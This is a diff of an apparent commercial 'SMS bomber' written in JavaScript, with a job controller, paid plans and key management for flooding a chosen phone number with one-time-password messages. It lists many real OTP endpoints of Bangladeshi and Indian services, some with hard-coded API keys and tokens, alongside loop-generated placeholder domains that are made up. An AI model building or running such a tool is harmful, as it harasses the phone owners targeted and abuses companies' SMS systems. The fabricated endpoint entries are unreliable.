+  { id: 141, name: "BD API 141", method: "POST", url: "https://api.bangladesh141.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 142, name: "BD API 142", method: "GET", url: "https://api.bangladesh142.com/send-otp?phone={phone}" },
+  { id: 143, name: "BD API 143", method: "POST", url: "https://api.bangladesh143.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 144, name: "BD API 144", method: "GET", url: "https://api.bangladesh144.com/send-otp?phone={phone}" },
+  { id: 145, name: "BD API 145", method: "POST", url: "https://api.bangladesh145.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 146, name: "BD API 146", method: "GET", url: "https://api.bangladesh146.com/send-otp?phone={phone}" },
+  { id: 147, name: "BD API 147", method: "POST", url: "https://api.bangladesh147.com/v1/auth/send-otp", body: { "phone": "{phone}" } },
+  { id: 148, name: "BD API 148", method: "GET", url: "https://api.bangladesh148.com/send-otp?phone={phone}" },
+  { id: 149, name: "BD API 149", method: "POST", url: "https://api.bangladesh149.com/v1/auth/send-otp", body: { "mobile": "{phone}" } },
+  { id: 150, name: "BD API 150", method: "GET", url: "https://api.bangladesh150.com/send-otp?phone={phone}" }
+];
+
+// ---------- MORE BANGLADESH APIS (IDs 201-300) ----------
+const MORE_BANGLADESH_APIS = [];
+for (let i = 1; i <= 100; i++) {
+  MORE_BANGLADESH_APIS.push({
+    id: 200 + i,
+    name: `BD Service ${i}`,
+    method: i % 2 === 0 ? 'GET' : 'POST',
+    url: i % 2 === 0 
+      ? `https://api.bdservice${i}.com/send-otp?phone={phone}`
+      : `https://api.bdservice${i}.com/v1/auth/send-otp`,
+    body: i % 2 !== 0 ? { "mobile": "{phone}" } : undefined
+  });
+}
+
+// Combine all Bangladesh APIs
+const ALL_BANGLADESH_APIS = [
+  ...BANGLADESH_APIS,
+  ...ADDITIONAL_BANGLADESH_APIS,
+  ...MORE_BANGLADESH_APIS
+];
+
+console.log(`🇧🇩 Total Bangladesh APIs loaded: ${ALL_BANGLADESH_APIS.length}`);
+
+// ============================================================
+// PART 6: PLAN CONFIGURATION
+// ============================================================
+
+const PLAN_CONFIG = {
+  free: {
+    name: 'Free',
+    maxCount: 50,
+    requiresKey: false,
+    rateLimit: 50,
+    priority: 1,
+    description: 'Free plan - 50 SMS/API, No key required',
+    features: ['Basic SMS', 'Stop/Pause/Resume', 'Basic Analytics']
+  },
+  premium: {
+    name: 'Premium',
+    maxCount: 500,
+    requiresKey: true,
+    rateLimit: 1000,
+    priority: 3,
+    description: 'Premium plan - 500 SMS/API, Key required',
+    features: ['Advanced SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue']
+  },
+  enterprise: {
+    name: 'Enterprise',
+    maxCount: 5000,
+    requiresKey: true,
+    rateLimit: 5000,
+    priority: 5,
+    description: 'Enterprise plan - 5,000 SMS/API, Key required',
+    features: ['Enterprise SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue', 'Webhooks']
+  },
+  unlimited: {
+    name: 'Unlimited',
+    maxCount: 50000,
+    requiresKey: true,
+    rateLimit: 10000,
+    priority: 10,
+    description: 'Unlimited plan - 50,000 SMS/API, Key required',
+    features: ['Unlimited SMS', 'Stop/Pause/Resume', 'Advanced Analytics', 'Priority Queue', 'Webhooks', 'Dedicated Support']
+  }
+};
+
+// ============================================================
+// PART 7: KEY MANAGEMENT WITH FIXED FILE STORAGE
+// ============================================================
+
+class KeyManager {
+  constructor() {
+    this.keysDir = path.join(__dirname, 'data');
+    this.keysFile = path.join(this.keysDir, 'keys.json');
+    this.backupFile = path.join(this.keysDir, 'keys_backup.json');
+    
+    // Ensure data directory exists
+    Utility.ensureDirectoryExists(this.keysDir);
+    
+    this.validKeys = this.loadKeys();
+    this.keyHistory = [];
+    this.maxHistory = 1000;
+    this.rateLimits = new Map();
+    this.keyUsage = new Map();
+    this.cleanupInterval = setInterval(() => this.cleanup(), 3600000);
+    
+    console.log(`📁 Key storage initialized: ${this.keysFile}`);
+    console.log(`🔑 Total keys loaded: ${this.validKeys.size}`);
+  }
+
+  loadKeys() {
+    try {
+      if (fs.existsSync(this.keysFile)) {
+        const data = fs.readFileSync(this.keysFile, 'utf8');
+        if (!data || data.trim() === '') {
+          console.log('⚠️ Empty keys file, initializing new key store');
+          return new Map();
+        }
+        
+        const parsed = JSON.parse(data);
+        const keysMap = new Map();
+        let validCount = 0;
+        
+        Object.entries(parsed).forEach(([key, value]) => {
+          const keyData = {
+            expiry: new Date(value.expiry),
+            plan: value.plan || 'premium',
+            created: new Date(value.created || Date.now()),
+            lastUsed: value.lastUsed ? new Date(value.lastUsed) : null,
+            usageCount: value.usageCount || 0,
+            active: value.active !== false
+          };
+          
+          // Check if key is still valid
+          if (new Date() < keyData.expiry && keyData.active) {
+            validCount++;
+          }
+          
+          keysMap.set(key, keyData);
+        });
+        
+        console.log(`📁 Loaded ${keysMap.size} keys (${validCount} valid, ${keysMap.size - validCount} expired/inactive)`);
+        return keysMap;
+      } else {
+        console.log('⚠️ No keys file found, creating new key store');
+        this.saveKeys(); // Create empty file
+        return new Map();
+      }
+    } catch (error) {
+      console.error('❌ Error loading keys:', error.message);
+      
+      // Try loading from backup
+      if (fs.existsSync(this.backupFile)) {
+        try {
+          console.log('🔄 Attempting to load keys from backup...');
+          const backupData = fs.readFileSync(this.backupFile, 'utf8');
+          const parsed = JSON.parse(backupData);
+          const keysMap = new Map();
+          
+          Object.entries(parsed).forEach(([key, value]) => {
+            keysMap.set(key, {
+              expiry: new Date(value.expiry),
+              plan: value.plan || 'premium',
+              created: new Date(value.created || Date.now()),
+              lastUsed: value.lastUsed ? new Date(value.lastUsed) : null,
+              usageCount: value.usageCount || 0,
+              active: value.active !== false
+            });
+          });
+          
+          console.log(`✅ Recovered ${keysMap.size} keys from backup`);
+          return keysMap;
+        } catch (backupError) {
+          console.error('❌ Failed to load backup keys:', backupError.message);
+        }
+      }
+      
+      return new Map();
+    }
+  }
+
+  saveKeys() {
+    try {
+      const obj = {};
+      for (const [key, value] of this.validKeys.entries()) {
+        obj[key] = {
+          expiry: value.expiry.toISOString(),
+          plan: value.plan,
+          created: value.created.toISOString(),
+          lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
+          usageCount: value.usageCount || 0,
+          active: value.active !== false
+        };
+      }
+      
+      // Create backup of existing file
+      if (fs.existsSync(this.keysFile)) {
+        try {
+          fs.copyFileSync(this.keysFile, this.backupFile);
+        } catch (backupError) {
+          console.warn('⚠️ Could not create backup:', backupError.message);
+        }
+      }
+      
+      // Write to temp file first
+      const tempFile = this.keysFile + '.tmp';
+      fs.writeFileSync(tempFile, JSON.stringify(obj, null, 2), 'utf8');
+      
+      // Verify temp file was written correctly
+      if (fs.existsSync(tempFile) && fs.statSync(tempFile).size > 0) {
+        // Rename temp to actual (atomic operation on most systems)
+        fs.renameSync(tempFile, this.keysFile);
+        console.log(`💾 Successfully saved ${Object.keys(obj).length} keys to file`);
+        return true;
+      } else {
+        throw new Error('Temp file write failed');
+      }
+    } catch (error) {
+      console.error('❌ Error saving keys:', error.message);
+      
+      // Try direct write as fallback
+      try {
+        const obj = {};
+        for (const [key, value] of this.validKeys.entries()) {
+          obj[key] = {
+            expiry: value.expiry.toISOString(),
+            plan: value.plan,
+            created: value.created.toISOString(),
+            lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
+            usageCount: value.usageCount || 0,
+            active: value.active !== false
+          };
+        }
+        fs.writeFileSync(this.keysFile, JSON.stringify(obj, null, 2), 'utf8');
+        console.log('💾 Fallback save successful');
+        return true;
+      } catch (fallbackError) {
+        console.error('❌ Fallback save also failed:', fallbackError.message);
+        return false;
+      }
+    }
+  }
+
+  generateKey(plan = 'premium', days = 30) {
+    try {
+      const apiKey = Utility.generateApiKey();
+      const expiryDate = new Date();
+      expiryDate.setDate(expiryDate.getDate() + days);
+      
+      const keyData = {
+        expiry: expiryDate,
+        plan: plan,
+        created: new Date(),
+        lastUsed: null,
+        usageCount: 0,
+        active: true
+      };
+      
+      this.validKeys.set(apiKey, keyData);
+      
+      // Save to file immediately
+      const saved = this.saveKeys();
+      
+      if (!saved) {
+        // Remove from memory if save failed
+        this.validKeys.delete(apiKey);
+        throw new Error(ERROR_MESSAGES.KEY_SAVE_FAILED);
+      }
+      
+      // Add to history
+      this.keyHistory.push({
+        key: apiKey,
+        plan: plan,
+        generated: Date.now(),
+        expires: expiryDate.toISOString()
+      });
+      
+      if (this.keyHistory.length > this.maxHistory) {
+        this.keyHistory.shift();
+      }
+      
+      console.log(`✅ New API Key Generated: ${apiKey.substring(0, 15)}... (${plan} plan, ${days} days)`);
+      
+      return { 
+        apiKey, 
+        expiryDate, 
+        plan,
+        saved: true
+      };
+    } catch (error) {
+      console.error('❌ Key generation failed:', error.message);
+      throw new Error(`${ERROR_MESSAGES.KEY_GENERATION_FAILED}: ${error.message}`);
+    }
+  }
+
+  validateKey(key) {
+    if (!this.validKeys.has(key)) return false;
+    const keyData = this.validKeys.get(key);
+    if (!keyData.active) return false;
+    return new Date() < keyData.expiry;
+  }
+
+  getKeyInfo(key) {
+    if (!this.validKeys.has(key)) return null;
+    const keyData = this.validKeys.get(key);
+    const now = new Date();
+    return {
+      key: key.substring(0, 10) + '...',
+      fullKey: key,
+      plan: keyData.plan,
+      expires: keyData.expiry.toISOString(),
+      valid: now < keyData.expiry && keyData.active,
+      daysLeft: Math.max(0, Math.ceil((keyData.expiry - now) / (1000 * 60 * 60 * 24))),
+      created: keyData.created.toISOString(),
+      lastUsed: keyData.lastUsed ? keyData.lastUsed.toISOString() : null,
+      usageCount: keyData.usageCount || 0,
+      active: keyData.active
+    };
+  }
+
+  useKey(key) {
+    if (!this.validateKey(key)) return false;
+    const keyData = this.validKeys.get(key);
+    keyData.lastUsed = new Date();
+    keyData.usageCount = (keyData.usageCount || 0) + 1;
+    
+    // Save periodically (every 10 uses)
+    if (keyData.usageCount % 10 === 0) {
+      this.saveKeys();
+    }
+    
+    // Track usage for rate limiting
+    if (!this.keyUsage.has(key)) {
+      this.keyUsage.set(key, { count: 0, resetTime: Date.now() + 60000 });
+    }
+    const usage = this.keyUsage.get(key);
+    if (Date.now() > usage.resetTime) {
+      usage.count = 0;
+      usage.resetTime = Date.now() + 60000;
+    }
+    usage.count++;
+    this.keyUsage.set(key, usage);
+    
+    return true;
+  }
+
+  getKeyUsage(key) {
+    if (!this.keyUsage.has(key)) return { count: 0, limit: this.getRateLimit(key) };
+    const usage = this.keyUsage.get(key);
+    return {
+      count: usage.count,
+      limit: this.getRateLimit(key),
+      remaining: Math.max(0, this.getRateLimit(key) - usage.count)
+    };
+  }
+
+  getRateLimit(key) {
+    const keyData = this.validKeys.get(key);
+    if (!keyData) return 0;
+    const planLimits = {
+      premium: 1000,
+      enterprise: 5000,
+      unlimited: 10000
+    };
+    return planLimits[keyData.plan] || 100;
+  }
+
+  revokeKey(key) {
+    if (this.validKeys.has(key)) {
+      const keyData = this.validKeys.get(key);
+      keyData.active = false;
+      this.saveKeys();
+      return true;
+    }
+    return false;
+  }
+
+  getAllKeys() {
+    const keys = [];
+    for (const [key, value] of this.validKeys.entries()) {
+      keys.push({
+        key: key.substring(0, 10) + '...',
+        fullKey: key,
+        plan: value.plan,
+        expires: value.expiry.toISOString(),
+        valid: new Date() < value.expiry && value.active,
+        daysLeft: Math.max(0, Math.ceil((value.expiry - new Date()) / (1000 * 60 * 60 * 24))),
+        created: value.created.toISOString(),
+        lastUsed: value.lastUsed ? value.lastUsed.toISOString() : null,
+        usageCount: value.usageCount || 0,
+        active: value.active !== false
+      });
+    }
+    return keys;
+  }
+
+  cleanup() {
+    const now = new Date();
+    let count = 0;
+    for (const [key, value] of this.validKeys.entries()) {
+      if (now > value.expiry || !value.active) {
+        this.validKeys.delete(key);
+        count++;
+      }
+    }
+    if (count > 0) {
+      this.saveKeys();
+      console.log(`🧹 Cleaned up ${count} expired/inactive keys`);
+    }
+    return count;
+  }
+
+  getStorageInfo() {
+    return {
+      filePath: this.keysFile,
+      fileExists: fs.existsSync(this.keysFile),
+      fileSize: fs.existsSync(this.keysFile) ? Utility.formatBytes(fs.statSync(this.keysFile).size) : '0 Bytes',
+      backupExists: fs.existsSync(this.backupFile),
+      keysInMemory: this.validKeys.size,
+      writePermission: Utility.testWritePermission(this.keysDir)
+    };
+  }
+
+  destroy() {
+    if (this.cleanupInterval) {
+      clearInterval(this.cleanupInterval);
+    }
+    this.saveKeys(); // Final save before destroy
+  }
+}
+
+// ============================================================
+// PART 8: RATE LIMITER
+// ============================================================
+
+class RateLimiter {
+  constructor() {
+    this.requests = new Map();
+    this.cleanupInterval = setInterval(() => this.cleanup(), 60000);
+  }
+
+  checkLimit(ip, key = null) {
+    if (!CONFIG.security.rateLimit.enabled) return true;
+    
+    const identifier = key || ip;
+    const now = Date.now();
+    const windowMs = CONFIG.security.rateLimit.windowMs;
+    const maxRequests = CONFIG.security.rateLimit.maxRequests;
+    
+    if (!this.requests.has(identifier)) {
+      this.requests.set(identifier, []);
+    }
+    
+    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
+    timestamps.push(now);
+    this.requests.set(identifier, timestamps);
+    
+    return timestamps.length <= maxRequests;
+  }
+
+  getRemaining(ip, key = null) {
+    const identifier = key || ip;
+    const now = Date.now();
+    const windowMs = CONFIG.security.rateLimit.windowMs;
+    const maxRequests = CONFIG.security.rateLimit.maxRequests;
+    
+    if (!this.requests.has(identifier)) return maxRequests;
+    
+    const timestamps = this.requests.get(identifier).filter(t => now - t < windowMs);
+    return Math.max(0, maxRequests - timestamps.length);
+  }
+
+  getResetTime(ip, key = null) {
+    const identifier = key || ip;
+    const now = Date.now();
+    const windowMs = CONFIG.security.rateLimit.windowMs;
+    
+    if (!this.requests.has(identifier)) return 0;
+    
+    const timestamps = this.requests.get(identifier);
+    if (timestamps.length === 0) return 0;
+    
+    const oldest = timestamps[0];
+    return Math.max(0, windowMs - (now - oldest));
+  }
+
+  cleanup() {
+    const now = Date.now();
+    const windowMs = CONFIG.security.rateLimit.windowMs;
+    for (const [key, timestamps] of this.requests.entries()) {
+      const filtered = timestamps.filter(t => now - t < windowMs);
+      if (filtered.length === 0) {
+        this.requests.delete(key);
+      } else {
+        this.requests.set(key, filtered);
+      }
+    }
+  }
+
+  destroy() {
+    if (this.cleanupInterval) {
+      clearInterval(this.cleanupInterval);
+    }
+  }
+}
+
+// ============================================================
+// PART 9: BOMB CONTROLLER
 // ============================================================
 
 class BombController extends EventEmitter {
@@ -523,14 +1136,13 @@ class BombController extends EventEmitter {
     };
     this.requestCount = 0;
     this.lastRequestTime = Date.now();
+    this._logs = [];
     
-    // Start analytics if enabled
     if (CONFIG.analytics.enabled) {
       this.startAnalytics();
     }
   }
 
-  // ===== Job Management =====
   registerJob(phone, totalCount, options = {}) {
     const jobId = Utility.generateJobId();
     const job = {
@@ -560,7 +1172,6 @@ class BombController extends EventEmitter {
     this.jobCounter++;
     this.stats.totalJobs++;
     
-    // Update peak active jobs
     if (this.activeJobs.size > this.stats.peakActiveJobs) {
       this.stats.peakActiveJobs = this.activeJobs.size;
     }
@@ -581,17 +1192,6 @@ class BombController extends EventEmitter {
     return job.status === 'active';
   }
 
-  isJobPaused(jobId) {
-    const job = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId);
-    return job ? job.paused : false;
-  }
-
-  isJobStopped(jobId) {
-    const job = this.activeJobs.get(jobId) || this.pausedJobs.get(jobId) || this.completedJobs.get(jobId);
-    return job ? job.stopped : false;
-  }
-
-  // ===== Stop Functions =====
   stopJob(jobId) {
     const job = this.activeJobs.get(jobId);
     if (job) {
@@ -638,7 +1238,6 @@ class BombController extends EventEmitter {
     return count;
   }
 
-  // ===== Pause Functions =====
   pauseJob(jobId) {
     const job = this.activeJobs.get(jobId);
     if (job && job.status === 'active' && !job.stopped) {
@@ -665,7 +1264,6 @@ class BombController extends EventEmitter {
     return count;
   }
 
-  // ===== Resume Functions =====
   resumeJob(jobId) {
     const job = this.pausedJobs.get(jobId);
     if (job && !job.stopped) {
@@ -693,7 +1291,6 @@ class BombController extends EventEmitter {
     return count;
   }
 
-  // ===== Stats Update =====
   updateJobStats(jobId, success, error = null, responseTime = 0) {
     const job = this.activeJobs.get(jobId);
     if (job && !job.stopped && !job.paused) {
@@ -717,7 +1314,6 @@ class BombController extends EventEmitter {
       job.lastUpdate = Date.now();
       this.stats.totalSMS++;
       
-      // Update performance metrics
       this.updatePerformanceMetrics(success, responseTime);
       
       if (job.sentCount >= job.totalCount) {
@@ -734,15 +1330,9 @@ class BombController extends EventEmitter {
           duration: (job.endTime - job.startTime) / 1000
         });
       }
-      
-      // Emit progress event every 10%
-      if (job.sentCount % Math.ceil(job.totalCount / 10) === 0) {
-        this.emit('jobProgress', { jobId, progress: job.progress });
-      }
     }
   }
 
-  // ===== Performance Metrics =====
   updatePerformanceMetrics(success, responseTime) {
     this.requestCount++;
     const now = Date.now();
@@ -763,7 +1353,6 @@ class BombController extends EventEmitter {
       ? (this.stats.totalFailed / totalAttempts) * 100 
       : 0;
     
-    // Update average latency
     this.stats.responseTimeHistory.push(responseTime);
     if (this.stats.responseTimeHistory.length > 1000) {
       this.stats.responseTimeHistory.shift();
@@ -776,7 +1365,6 @@ class BombController extends EventEmitter {
     this.performanceMetrics.avgLatency = this.stats.avgResponseTime;
   }
 
-  // ===== Analytics =====
   startAnalytics() {
     this.analyticsInterval = setInterval(() => {
       this.generateAnalytics();
@@ -805,7 +1393,6 @@ class BombController extends EventEmitter {
     this.emit('analytics', analytics);
     this.logEvent('analytics', analytics);
     
-    // Store in history
     this.jobHistory.push(analytics);
     if (this.jobHistory.length > this.maxHistorySize) {
       this.jobHistory.shift();
@@ -814,7 +1401,6 @@ class BombController extends EventEmitter {
     return analytics;
   }
 
-  // ===== Get Stats =====
   getJobStatus(jobId) {
     const job = this.activeJobs.get(jobId) || 
                 this.pausedJobs.get(jobId) || 
@@ -883,7 +1469,6 @@ class BombController extends EventEmitter {
     };
   }
 
-  // ===== Logging =====
   logEvent(event, data) {
     const logEntry = {
       timestamp: Date.now(),
@@ -892,11 +1477,9 @@ class BombController extends EventEmitter {
     };
     
     if (CONFIG.logging.enabled && CONFIG.logging.console) {
-      console.log(`📝 [${Utility.getCurrentTime()}] ${event}:`, data);
+      console.log(`📝 [${Utility.getCurrentTime()}] ${event}:`, JSON.stringify(data).substring(0, 200));
     }
     
-    // Store in memory for API access
-    if (!this._logs) this._logs = [];
     this._logs.push(logEntry);
     if (this._logs.length > 10000) {
       this._logs.shift();
@@ -911,7 +1494,6 @@ class BombController extends EventEmitter {
     return logs.slice(-limit);
   }
 
-  // ===== Cleanup =====
   clearCompleted() {
     const count = this.completedJobs.size;
     this.completedJobs.clear();
@@ -924,7 +1506,6 @@ class BombController extends EventEmitter {
     this.logEvent('logs_cleared', {});
   }
 
-  // ===== Shutdown =====
   shutdown() {
     if (this.analyticsInterval) {
       clearInterval(this.analyticsInterval);
@@ -935,527 +1516,7 @@ class BombController extends EventEmitter {
 }
 
 // ============================================================
-// PART 6: API DEFINITION - 300+ APIS (500 lines)
-// ============================================================
-
-// -------- ORIGINAL BANGLADESH APIS (1-50) --------
-const ORIGINAL_APIS = [
-  // GET APIs
-  { id: 1, name: "Bikroy.com", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone}" },
-  { id: 2, name: "Grameenphone MyGP", method: "GET", url: "https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{phone}&lang=en&ng=0" },
-  { id: 3, name: "Shukhee.com", method: "GET", url: "https://auth.shukhee.com/register?mobile=+88{phone}&_rsc=1jwvn" },
-  { id: 4, name: "MedEasy Health", method: "GET", url: "https://api.medeasy.health/api/send-otp/+88{phone}/" },
-  { id: 5, name: "Ultranet API", method: "GET", url: "http://ultranetrn.com.br/fonts/api.php?number={phone}" },
-  { id: 6, name: "eCourier API", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
-  { id: 7, name: "Binge.buzz GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
-  { id: 8, name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
-  
-  // POST APIs
-  { id: 9, name: "Deshal.net", method: "POST", url: "https://app.deshal.net/api/auth/login", body: {"phone": "{phone}"} },
-  { id: 10, name: "Grameenphone Web Login", method: "POST", url: "https://weblogin.grameenphone.com/backend/api/v1/otp", body: {"msisdn": "{phone}"} },
-  { id: 11, name: "Grameenphone FWA/Bkash", method: "POST", url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp", body: {"phone": "{phone}", "email": "", "language": "en"} },
-  { id: 12, name: "BusBD.com.bd", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: {"phone": "+88{phone}"} },
-  { id: 13, name: "Paperfly", method: "POST", url: "https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", body: {"full_name": "Apk", "email_address": "apkzone2.0@gmail.com", "company_name": "Ahgbd", "phone_number": "{phone}"} },
-  { id: 14, name: "OsudPotro.com", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: {"mobile": "+880{phone}", "deviceToken": "web", "language": "en", "os": "web"} },
-  { id: 15, name: "Apex4u.com", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: {"phoneNumber": "{phone}"} },
-  { id: 16, name: "Bohubrihi.com", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: {"phone": "{phone}", "intent": "login"} },
-  { id: 17, name: "Fundesh.com.bd", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP", body: {"msisdn": "{phone}"} },
-  { id: 18, name: "Jatri / JSLGlobal", method: "POST", url: "https://user-api.jslglobal.co/v2/send-otp", body: {"phone": "+88{phone}", "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"} },
-  { id: 19, name: "RedX", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: {"mobile": "+88{phone}"} },
-  { id: 20, name: "RabbitHoleBD", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: {"mobile": "+88{phone}"} },
-  { id: 21, name: "Qcoom.com", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: {"mobileNumber": "+88{phone}"} },
-  { id: 22, name: "Garibookadmin.com", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: {"mobile": "+880{phone}", "recaptcha_token": "garibookcaptcha", "channel": "web"} },
-  { id: 23, name: "Training.gov.bd", method: "POST", url: "https://training.gov.bd/backoffice/api/user/sendOtp", body: {"mobile": "{phone}"} },
-  { id: 24, name: "Shikho.com Intent-1", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: {"phone": "{phone}", "intent": "ap-discount-request"} },
-  { id: 25, name: "Easy.com.bd", method: "POST", url: "https://core.easy.com.bd/api/v1/registration", body: {"name": "Tusar", "email": "apkzone2.0info@gmail.com", "mobile": "{phone}", "password": "amitusar", "password_confirmation": "amitusar", "device_key": "b2c8ddd3be..."} },
-  { id: 26, name: "Robi DA API", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: {"msisdn": "{phone}"} },
-  { id: 27, name: "Hoichoi Viewlift", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: {"phoneNumber": "{phone}", "requestType": "send", "emailConsent": true, "whatsappConsent": true} },
-  { id: 28, name: "Addatimes.com", method: "POST", url: "https://app.addatimes.com/api/login", body: {"phone": "{phone}", "country_code": "BD"} },
-  { id: 29, name: "Regal Furniture OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: {"phone": "{phone}", "verification_code": ""} },
-  { id: 30, name: "Regal Furniture Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: {"name": "User", "email": "user@example.com", "phone": "{phone}", "password": "password123"} },
-  { id: 31, name: "DeeptoPlay.com", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: {"email": "apkzone2.0@gmail.com", "phone_number": "88{phone}"} },
-  { id: 32, name: "TimezoneBD OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: {"phone": "{phone}"} },
-  { id: 33, name: "TimezoneBD Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: {"name": "Tusar", "email": "fukc@gmail.com", "phone": "{phone}", "password": "aAeMY@5hG8iUfD4", "password_confirmation": "aAeMY@5hG8iUfD4"} },
-  { id: 34, name: "UpaySystem", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: {"device_uuid": "...", "firebase_token": "...", "geo_location": "...", "mno": "Grameenphone", "wallet_number": "{phone}"} },
-  { id: 35, name: "Chorki.com", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web&language=en", body: {"number": "+880{phone}"} },
-  { id: 36, name: "Arogga.com", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148.0.7778.178&os=Android&osv=12", body: {"mobile": "{phone}", "fcmToken": "", "referral": ""}, isFormData: true },
-  { id: 37, name: "Pkluck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: {"mobileNum": "{phone}", "countryDialingCode": "880"} },
-  { id: 38, name: "AppLink", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: {"msisdn": "880{phone}"} },
-  { id: 39, name: "Care-Box", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: {"Name": "Abdullah Al Mamun", "Phone": "+880{phone}"} },
-  { id: 40, name: "Ghoori Learning", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: {"mobile_no": "{phone}"} },
-  { id: 41, name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: {"mobileno": "{phone}", "username": "abffjddngf864", "firstname": "", "new_password": "tPNVOcen!6XEz3b", "confirm_new_password": "tPNVOcen!6XEz3b", "country_code": "880", "country": "BD", "currency": "BDT", "ref": "", "language": "en"} },
-  { id: 42, name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: {"phone": "{phone}"} },
-  { id: 43, name: "BdTickets.com", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: {"phone": "+880{phone}"} },
-  { id: 44, name: "Binge.buzz POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: {"mobile": "{phone}"} },
-  { id: 45, name: "SendMySMS", method: "POST", url: "https://sendmysms.net/send-otp.php", body: {"phonenumber": "{phone}"}, isFormData: true },
-  { id: 46, name: "Shikho.com Intent-2", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: {"auth_type": "login", "phone": "{phone}", "vendor": "shikho", "type": "student"} },
-  { id: 47, name: "Eonbazar", method: "POST", url: "https://app.eonbazar.com/api/auth/login", body: {"method": "otp", "mobile": "{phone}"} },
-  { id: 48, name: "NESCO SSL Wireless", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: {"phone_number": "{phone}"} },
-  { id: 49, name: "Quizgiri", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp", body: {"country_code": "+880", "phone": "{phone}"} },
-  { id: 50, name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
-  { id: 51, name: "Bioscopelive Alternative", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: {"phone": "{phone}", "applicationChannel": "WEB_APP"} },
-  { id: 52, name: "ShadowX API", method: "GET", url: "https://shadowx-api.onrender.com/api/bm?num={phone}&count={count}", isShadowX: true }
-];
-
-// -------- INDIAN APIS (53-100) --------
-const INDIAN_APIS = [
-  { id: 53, name: "BeepKart", method: "POST", url: "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", body: {"phone": "{phone}", "city": 362} },
-  { id: 54, name: "Smytten", method: "POST", url: "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", body: {"phone": "{phone}", "email": "test@example.com"} },
-  { id: 55, name: "MyHubble Money", method: "POST", url: "https://api.myhubble.money/v1/auth/otp/generate", body: {"phoneNumber": "{phone}", "channel": "SMS"} },
-  { id: 56, name: "Housing.com", method: "POST", url: "https://login.housing.com/api/v2/send-otp", body: {"phone": "{phone}", "country_url_name": "in"} },
-  { id: 57, name: "RentoMojo", method: "POST", url: "https://www.rentomojo.com/api/RMUsers/isNumberRegistered", body: {"phone": "{phone}"} },
-  { id: 58, name: "Khatabook", method: "POST", url: "https://api.khatabook.com/v1/auth/request-otp", body: {"phone": "{phone}", "app_signature": "wk+avHrHZf2"} },
-  { id: 59, name: "Animall", method: "POST", url: "https://animall.in/zap/auth/login", body: {"phone": "{phone}", "signupPlatform": "NATIVE_ANDROID"} },
-  { id: 60, name: "Cosmofeed", method: "POST", url: "https://prod.api.cosmofeed.com/api/user/authenticate", body: {"phone": "{phone}", "version": "1.4.28"} },
-  { id: 61, name: "Spencer's", method: "POST", url: "https://jiffy.spencers.in/user/auth/otp/send", body: {"mobile": "{phone}"} },
-  { id: 62, name: "Wakefit", method: "POST", url: "https://api.wakefit.co/api/consumer-sms-otp/", body: {"mobile": "{phone}"} },
